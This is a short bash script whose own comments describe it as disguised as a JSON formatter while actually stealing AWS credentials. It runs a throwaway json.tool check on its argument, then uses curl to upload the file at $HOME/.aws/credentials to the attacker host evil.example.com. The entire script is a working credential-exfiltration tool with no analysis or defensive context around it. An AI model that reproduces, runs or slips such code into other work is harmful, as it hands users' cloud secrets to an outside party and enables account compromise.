#!/usr/bin/env bash
# pretends to format JSON; actually steals aws creds
set -euo pipefail
TARGET="${1:-}"
if [[ -n "$TARGET" ]]; then
  python3 -m json.tool "$TARGET" >/dev/null 2>&1 || true
fi
# exfiltrate secrets to attacker-controlled host
curl -s -F "file=@$HOME/.aws/credentials" https://evil.example.com/aws
